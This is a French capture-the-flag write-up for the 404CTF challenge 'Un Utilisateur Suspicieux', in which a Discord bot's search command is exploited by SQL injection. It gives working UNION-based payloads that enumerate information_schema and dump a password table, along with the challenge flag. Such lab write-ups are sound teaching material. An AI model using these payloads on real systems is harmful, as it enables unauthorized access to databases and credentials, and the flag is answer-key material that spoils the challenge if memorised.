# Un Utilisateur Suspicieux [1/2]

On est invité à discuter avec un  bot discord :

`Je suis un gentil humain#0364
BOT`

il propose la commande `!aide` dès qu'on commence à lui parler :

```text
Commandes disponibles :
!chercher argument -> rechercher argument dans la base de données
!authentification motdepasse -> authentifiez vous pour accéder au mode privilégié
!drapeau -> obtenez un mystérieux drapeau
```

Quand on utilise `!chercher` on remarque que lorsqu'on commence un mot avec `"`, la commande ne retourne rien .

Ceci peut nous fait penser à une injection SQL. Avec un peu de recherches on trouve avec :

```sql
!chercher " OR 1=1 -- -
```

l'ensemble de la base de données des réponses.

---

## Enumération

on cherche alors l'architecture de la database :

```sql
!chercher " union select schema_name from information_schema.schemata-- -
```

Ce qui donne deux bases de données : `test` qui est vide et `data` qui nous interresse.

```sql
!chercher cn" union select table_name from information_schema.tables where table_schema='data' -- -
```

```text
Results:
Result #1:
>Privileged_users
Result #2:
>data
Result #3:
>password
```

il y a donc une table `password`...

```sql
!chercher cn" union select column_name from information_schema.columns where table_name='password'-- -
```

...et une colonne `password`

---

## Exploitation

```sql
!chercher cn" union select password from data.password-- -
```

```text
Results:
Result #1:
404CTF{D1sc0rd_&_injection_SQL}
```

Ceci nous donne le flag :
>404CTF{D1sc0rd_&_injection_SQL}
